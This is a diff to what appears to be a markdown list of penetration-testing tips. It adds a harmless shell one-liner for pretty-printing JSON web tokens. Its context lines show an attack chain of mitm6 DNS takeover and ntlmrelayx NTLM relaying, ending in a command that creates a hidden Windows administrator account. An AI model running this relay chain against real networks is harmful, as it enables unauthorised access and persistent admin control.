@@ -55,3 +55,9 @@ mitm6 -i eth0 -d example.local
 
 ntlmrelayx.py -ip 0.0.0.0 -t rpc://example.local -c "net user nullenc0de nullen0code_is_Here /add && net localgroup Administrators nullenc0de /add"
 ```
+
+### @liamsomerville 
+
+A quick and easy way of pretty printing JSON web tokens: 
+
+```` echo "<JWT>" | tr "." "\n" | base64 -D | jq "." (-d on Linux) ````
